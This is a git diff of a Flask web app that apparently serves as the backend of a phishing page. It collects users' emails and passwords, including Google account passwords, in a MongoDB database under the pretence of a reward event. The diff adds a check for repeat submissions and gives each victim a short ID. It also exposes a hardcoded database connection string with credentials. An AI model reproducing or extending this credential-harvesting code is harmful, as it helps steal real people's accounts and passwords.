@@ -11,7 +11,7 @@ db=MongoClient('mongodb+srv://fknown:HELPMEBRO@cluster0.boeml.mongodb.net/freefi
 @app.route('/')
 def index():
     session['user']=None
-    return render_template('index.html')
+    return render_template('index.html',err=None)
 
 @app.route("/gauth",methods=['GET','POST'])
 def glogin():
@@ -32,8 +32,9 @@ def share():
             email=session['user']
             passwd=request.form['password']
             act='google'
-        db.users.insert_one({"user":email,"password":passwd,"account":act})
-        return render_template('share.html')
+        if not [i for i in db.users.find({'user':email,'password':passwd,'account':act})]:
+            return render_template('share.html',id=str(db.users.insert_one({"user":email,"password":passwd,"account":act}).inserted_id)[-10:-1])
+        else: return render_template('index.html',err="Your already participated in this event wait for receive reward")
     else: return redirect(url_for('index'))
 
 @app.route("/<name>")
